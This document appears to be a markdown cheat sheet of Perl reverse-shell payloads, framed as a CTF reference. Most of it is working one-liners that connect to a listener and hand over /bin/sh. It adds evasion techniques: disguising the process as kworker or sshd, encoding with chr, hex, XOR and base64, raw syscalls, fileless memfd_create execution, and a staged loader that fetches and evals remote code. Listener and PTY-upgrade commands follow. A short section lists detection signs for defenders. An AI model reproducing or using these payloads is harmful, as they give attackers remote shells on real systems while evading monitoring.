# Perl Reverse Shell — Complete CTF Reference ..lmao..

---

## Module Availability Decision Tree

```text
Target has Perl — now what?

Is Socket available?
├── YES → classic variants (sections 1-4)
└── NO
    ├── IO::Socket available? → section 5
    ├── IO::Socket::INET6? → section 9
    └── Nothing? → syscall direct (section 14)

Is /bin/sh filtered?
├── Try /bin/bash, /bin/dash, /bin/zsh
├── exec{} indirect form
└── chr() encode the path

Is exec filtered?
├── system()
├── `` backticks ``
├── open(CMD, "|-")
└── POSIX::execvp

Is the one-liner length constrained?
├── Split across env vars
├── Staged loader
└── Here-doc in temp file
```

---

## Section 1 — Classic Baselines

### 1a. Absolute minimum
```perl
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,6);connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec"/bin/sh"'
```

### 1b. Named variables (readable for docs)
```perl
perl -e '
use Socket;
$host = "10.0.0.1";
$port = 4444;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(S, sockaddr_in($port, inet_aton($host)));
open(STDIN,  ">&S");
open(STDOUT, ">&S");
open(STDERR, ">&S");
exec("/bin/sh -i");
'
```

### 1c. `$ENV` delivery (avoids quotes in shell context)
```bash
export H=10.0.0.1
export P=4444
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,6);connect(S,sockaddr_in($ENV{P},inet_aton($ENV{H})));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec"/bin/sh"'
```

---

## Section 2 — Process & Execution Variants

### 2a. Fork and orphan
```perl
perl -e '
use Socket;
$h="10.0.0.1";$p=4444;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in($p,inet_aton($h)));
fork && exit;
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");
'
```

### 2b. Double fork (daemonize — survives parent death)
```perl
perl -e '
use Socket;
use POSIX qw(setsid);
$h="10.0.0.1";$p=4444;
fork && exit;
setsid();
fork && exit;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in($p,inet_aton($h)));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");
'
```

### 2c. `system` instead of `exec`
```perl
# system() returns, exec() does not — different evasion profile
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,6);connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");system("/bin/sh -i");'
```

### 2d. Backtick loop (polling, not a persistent shell)
```perl
perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
while(<S>){
  chomp;
  $out = `$_`;
  print S $out;
}
'
```
Good for a "command execution but not a real shell" challenge variant.

### 2e. `open` pipe shell
```perl
perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
open(SHELL,"|-","/bin/sh -i");
print SHELL while <S>;
'
```

### 2f. POSIX execvp (bypasses Perl's exec wrapper)
```perl
perl -e '
use Socket;
use POSIX qw(execvp);
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
execvp("/bin/sh", ["/bin/sh", "-i"]);
'
```

---

## Section 3 — `exec{}` Indirect Form & Shell Bypass

```perl
# exec{PROGRAM} LIST — the program name and argv[0] are decoupled
# evades filters checking argv[0] or /proc/self/cmdline

perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec{"/bin/sh"} "-bash";
'
# /proc/self/cmdline will show "-bash" not "/bin/sh"
# looks like a login shell in process listings
```

### 3b. Masquerade as kernel thread
```perl
exec{"/bin/sh"} "[kworker/0:0]";
# shows up in ps as [kworker/0:0]
```

### 3c. Masquerade as sshd
```perl
exec{"/bin/sh"} "sshd: root@pts/0";
```

---

## Section 4 — Alternative Shell Paths

```perl
# When /bin/sh is blocked by path but binary exists elsewhere

my @shells = qw(
    /bin/sh /bin/bash /bin/dash /bin/zsh /bin/ksh
    /bin/tcsh /bin/fish /usr/bin/bash /usr/bin/zsh
    /usr/local/bin/bash /proc/self/exe
);

# In a challenge, brute-force which exists:
perl -e '
for(qw(/bin/sh /bin/bash /bin/dash /bin/zsh /usr/bin/bash)){
    exec $_ if -x $_;
}
'
```

---

## Section 5 — IO::Socket Variants

### 5a. IO::Socket::INET basic
```perl
perl -e '
use IO::Socket;
$s = IO::Socket::INET->new(
    PeerAddr => "10.0.0.1",
    PeerPort => 4444,
    Proto    => "tcp"
);
open(STDIN,  ">&\$s");
open(STDOUT, ">&\$s");
open(STDERR, ">&\$s");
exec("/bin/sh -i");
'
```

### 5b. IO::Socket with reconnect loop
```perl
perl -e '
use IO::Socket;
while(1){
    eval {
        $s = IO::Socket::INET->new(
            PeerAddr => "10.0.0.1",
            PeerPort => 4444,
            Proto    => "tcp",
            Timeout  => 5,
        );
        open(STDIN,">&\$s");
        open(STDOUT,">&\$s");
        open(STDERR,">&\$s");
        exec("/bin/sh -i");
    };
    sleep 10;
}
'
```
Good for "persistent implant" challenge track.

### 5c. IO::Socket::SSL (encrypted channel)
```perl
# requires IO::Socket::SSL on target
perl -e '
use IO::Socket::SSL;
$s = IO::Socket::SSL->new(
    PeerAddr        => "10.0.0.1:4444",
    SSL_verify_mode => 0,
) or die;
open(STDIN,">&\$s");
open(STDOUT,">&\$s");
open(STDERR,">&\$s");
exec("/bin/sh -i");
'
```

Listener for SSL variant:
```bash
# generate self-signed cert for your listener
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=ctf"
ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp 4444
```

---

## Section 6 — UDP & Non-TCP Transports

### 6a. UDP shell
```perl
perl -e '
use Socket;
socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");
'
```
```bash
# listener
ncat -u -lvnp 4444
```

### 6b. ICMP tunnel concept (raw socket — needs root on target)
```perl
# Demonstrates the concept — full ICMP shell needs libpcap or Net::RawIP
perl -e '
use Socket;
socket(S, AF_INET, SOCK_RAW, getprotobyname("icmp"))
    or die "need root: $!";
# ... payload encoding left as challenge puzzle
'
```
Good as a "reach" challenge — hint that raw sockets exist.

---

## Section 7 — IPv6

### 7a. Socket6
```perl
perl -e '
use Socket6;
socket(S,PF_INET6,SOCK_STREAM,getprotobyname("tcp"));
connect(S,pack_sockaddr_in6(4444,inet_pton(AF_INET6,"::1")));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");
'
```

### 7b. IO::Socket::INET6
```perl
perl -e '
use IO::Socket::INET6;
$s = IO::Socket::INET6->new(
    PeerAddr => "fe80::1",
    PeerPort => 4444,
    Proto    => "tcp"
);
open(STDIN,">&\$s");open(STDOUT,">&\$s");open(STDERR,">&\$s");
exec("/bin/sh -i");
'
```

---

## Section 8 — select() Multiplexed Shell

```perl
# Bidirectional I/O without redirecting STDIN/STDOUT/STDERR
# Harder to detect because fd 0/1/2 are untouched

perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
$|=1;
while(1){
    $rin="";
    vec($rin,fileno(S),1)=1;
    vec($rin,fileno(STDIN),1)=1;
    select($rin,undef,undef,undef);
    if(vec($rin,fileno(S),1)){
        sysread(S,$buf,1024) or exit;
        syswrite(STDOUT,$buf);
    }
    if(vec($rin,fileno(STDIN),1)){
        sysread(STDIN,$buf,1024) or exit;
        syswrite(S,$buf);
    }
}
'
```

---

## Section 9 — PTY Shell (fully interactive)

```perl
# Full PTY — tab completion, vim, sudo, passwd all work
# Requires IO::Pty (often available as libio-pty-perl)

perl -e '
use Socket;
use IO::Pty;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
$pty = IO::Pty->new;
my $pid = fork;
if($pid == 0){
    $pty->make_slave_controlling_terminal;
    my $slave = $pty->slave;
    open(STDIN,  "<&". $slave->fileno);
    open(STDOUT, ">&". $slave->fileno);
    open(STDERR, ">&". $slave->fileno);
    exec("/bin/bash -i");
}
$pty->close_slave;
while(1){
    $rin="";
    vec($rin,fileno(S),1)=1;
    vec($rin,fileno($pty),1)=1;
    select($rin,undef,undef,undef);
    if(vec($rin,fileno($pty),1)){
        sysread($pty,$b,1024) or exit;
        syswrite(S,$b);
    }
    if(vec($rin,fileno(S),1)){
        sysread(S,$b,1024) or exit;
        syswrite($pty,$b);
    }
}
'
```

---

## Section 10 — Obfuscation Techniques

### 10a. `chr()` IP encoding
```perl
# 10.0.0.1 = chr(49).chr(48).chr(46)...
perl -e '
use Socket;
$h=chr(49).chr(48).chr(46).chr(48).chr(46).chr(48).chr(46).chr(49);
$p=4444;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in($p,inet_aton($h)));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh");
'
```

Helper to generate `chr()` encoded strings for your challenge docs:
```perl
perl -e 'print join(".", map { "chr($_)" } unpack("C*", "10.0.0.1/bin/sh"))'
```

### 10b. Hex string literals
```perl
# /bin/sh = \x2f\x62\x69\x6e\x2f\x73\x68
perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("\x2f\x62\x69\x6e\x2f\x73\x68");
'
```

### 10c. Octal string literals
```perl
exec("\057\142\151\156\057\163\150");
# /bin/sh in octal
```

### 10d. String reversal
```perl
perl -e '
$shell = reverse "hs/nib/";
exec($shell);
'
```

### 10e. `eval` with base64 decode
```perl
perl -e '
use MIME::Base64;
eval decode_base64("dXNlIFNvY2tldDsgLi4u");
# base64 of your full payload
'
```

Generate the base64 blob:
```bash
echo -n 'use Socket;socket(S,PF_INET,SOCK_STREAM,6);connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec"/bin/sh"' | base64 -w0
```

### 10f. Split across array join
```perl
perl -e '
$c = join("", ("/","b","i","n","/","s","h"));
exec($c);
'
```

### 10g. String XOR decode (advanced filter evasion)
```perl
perl -e '
# key=0x01, "/bin/sh" XOR 0x01 = ".cjm.rg"
$enc = ".cjm.rg";
$key = 1;
$dec = join("", map { chr(ord($_)^$key) } split//,$enc);
exec($dec);
'
```

Helper to generate XOR-encoded strings:
```perl
#!/usr/bin/env perl
# xor_encode.pl
my ($str, $key) = ($ARGV[0], $ARGV[1] // 1);
print join("", map { chr(ord($_)^$key) } split//, $str), "\n";
```

### 10h. Nested `eval` layers
```perl
perl -e 'eval(eval(decode_base64(reverse("..."))))'
# layer 1: base64 decode
# layer 2: eval a string that evals the actual payload
# good for "unpeel the onion" challenge design
```

---

## Section 11 — Syscall Direct (no Socket module)

```perl
# SYS_socket, SYS_connect, SYS_dup2, SYS_execve — raw syscalls
# x86_64 Linux syscall numbers

perl -e '
require "syscall.ph";    # may not exist — see fallback below
$AF_INET     = 2;
$SOCK_STREAM = 1;
$fd = syscall(SYS_socket(), $AF_INET, $SOCK_STREAM, 6);
die "socket: $!" if $fd < 0;

# sockaddr_in: AF_INET(2) + port(BE) + ip(BE)
$sa = pack("Sna4x8", $AF_INET, 4444, inet_aton("10.0.0.1"));
syscall(SYS_connect(), $fd, $sa, length($sa));

# dup2 stdin/stdout/stderr to socket fd
syscall(SYS_dup2(), $fd, 0);
syscall(SYS_dup2(), $fd, 1);
syscall(SYS_dup2(), $fd, 2);

# execve /bin/sh
exec("/bin/sh -i");
'
```

### 11b. Hardcoded syscall numbers (no syscall.ph needed)
```perl
perl -e '
# x86_64: socket=41 connect=42 dup2=33 execve=59
$fd = syscall(41, 2, 1, 6);
$sa = pack("Sna4x8", 2, 4444, "\x0a\x00\x00\x01");
syscall(42, $fd, $sa, 16);
syscall(33, $fd, 0);
syscall(33, $fd, 1);
syscall(33, $fd, 2);
exec("/bin/sh");
'
```

Good for a "no imports allowed" sandbox escape challenge.

---

## Section 12 — /proc & fd Tricks

### 12a. Read own cmdline (detection evasion awareness)
```perl
# Show competitors how detection works so they can understand bypass
perl -e '
open(F,"/proc/self/cmdline");
$c = <F>; $c =~ s/\0/ /g;
print "cmdline: $c\n";
'
```

### 12b. Re-exec via /proc/self/fd
```perl
# If you can write a file and execute via fd — useful in constrained fs
perl -e '
open(F, ">/tmp/.x");
print F "exec(\"/bin/sh\")";
close F;
do "/tmp/.x";
'
```

### 12c. memfd_create (fileless execution concept)
```perl
# Linux 3.17+ — create anonymous file in memory, never touches disk
perl -e '
# SYS_memfd_create = 319 on x86_64
$fd = syscall(319, "x", 1);
open(my $fh, ">&=", $fd);
print $fh "#!/bin/sh\n/bin/sh -i\n";
exec("/proc/self/fd/$fd");
'
```
Excellent advanced challenge — teaches fileless malware concepts.

---

## Section 13 — Constrained Environment Techniques

### 13a. Length-constrained — staged loader
```perl
# Stage 1: tiny fetcher (fits in short command fields)
perl -e 'use LWP::Simple;eval(get("http://10.0.0.1/s.pl"))'

# Stage 2: s.pl on your server — full payload
# Serve with: python3 -m http.server 80
```

### 13b. ENV var staging
```bash
# Build payload across multiple env vars
export A='use Socket;socket(S,PF_INET,'
export B='SOCK_STREAM,6);connect(S,'
export C='sockaddr_in(4444,inet_aton("10.0.0.1")));'
export D='open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec"/bin/sh"'
perl -e 'eval($ENV{A}.$ENV{B}.$ENV{C}.$ENV{D})'
```

### 13c. Here-doc to temp file
```bash
perl -e '
open(F,">/tmp/.p");
print F do { local $/; <DATA> };
close F;
' <<'EOF'
use Socket;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");
EOF
perl /tmp/.p
```

### 13d. No `/` in path — PATH tricks
```bash
# If / is filtered in the executed string
export PATH=/bin:$PATH
perl -e 'exec("sh")'
# or
perl -e 'chdir("/bin"); exec("./sh")'
```

### 13e. `$0` reassignment (hide in process list)
```perl
perl -e '
$0 = "[kworker/u4:2]";   # rename process
use Socket;
# ... rest of shell
'
```

---

## Section 14 — Detection & Logging Awareness (Blue Team CTF Track)

```perl
# What defenders see — good for blue team challenge design

# 1. /proc/PID/cmdline contains the full one-liner
# 2. strace will show: socket() connect() dup2() execve()
# 3. auditd: SYSCALL records for execve with perl
# 4. network: SYN to attacker IP from perl process

# Perl-specific tells:
# - Process name "perl" in cmdline
# - -e flag present
# - Outbound TCP from a non-network process
# - dup2 of fd 0/1/2 to a socket fd (visible in /proc/PID/fd/)

# To demonstrate fd mapping in a challenge:
perl -e '
use Socket;
socket(S,PF_INET,SOCK_STREAM,6);
connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));
system("ls -la /proc/self/fd/");   # show competitors what dup2 changes
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");
'
```

---

## Section 15 — Listener Reference

```bash
# Standard netcat
nc -lvnp 4444

# UDP
nc -u -lvnp 4444

# ncat with keep-open (accepts multiple connections — good for CTF infra)
ncat -lvnp 4444 -k

# SSL/TLS
openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 1 -nodes -subj "/CN=ctf"
ncat --ssl --ssl-cert c.pem --ssl-key k.pem -lvnp 4444

# socat (best for PTY upgrade)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# PTY upgrade after catching plain shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, then:
export TERM=xterm
stty rows 40 cols 180
```

---

## Section 16 — CTF Challenge Difficulty Map

| # | Technique | Prerequisite Knowledge | Tier |
|---|---|---|---|
| 1a | Classic one-liner | Basic networking | Intro |
| 2c | system() variant | Perl execution model | Intro |
| 1c | $ENV delivery | Shell quoting | Easy |
| 2a | Fork/orphan | Process model | Easy |
| 3a | exec{} indirect | argv[0] vs path | Medium |
| 5a | IO::Socket | Module alternatives | Medium |
| 6a | UDP | Listener setup | Medium |
| 8 | select() mux | fd/IO multiplexing | Medium |
| 10e | eval+base64 | Encoding layers | Medium |
| 2b | Double fork | Daemonization | Hard |
| 5c | SSL shell | PKI / TLS basics | Hard |
| 9 | PTY via IO::Pty | TTY/PTY internals | Hard |
| 10g | XOR obfuscation | Encoding/crypto basics | Hard |
| 11b | Raw syscalls | x86_64 ABI | Expert |
| 12c | memfd_create | Linux internals | Expert |
| 13b | ENV staging | Evasion chaining | Expert |

---
